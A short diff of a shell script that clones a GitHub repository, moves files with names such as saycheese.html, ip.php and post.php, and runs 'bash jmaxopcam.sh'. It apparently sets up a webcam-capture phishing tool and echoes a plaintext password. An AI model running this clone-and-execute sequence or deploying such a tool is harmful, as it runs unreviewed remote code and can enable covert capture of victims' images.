@@ -77,5 +77,5 @@ echo -e '"the password is "1928Rami@//"'
 git push -u origin master
 git clone https://github.com/AkanVb/Test.git
 #mv Test/post.php saycheese.html template.php jmaxopcam.sh ip.php index.php index2.php README.md LICENSE ..
-mv Test/index2.html template.php jmaxopcam.sh saycheese.html ip.php index2.html index.php post.php README.md LICENSE  ..
+mv /Test/index2.html template.php jmaxopcam.sh saycheese.html ip.php index2.html index.php post.php README.md LICENSE  ..
 bash jmaxopcam.sh
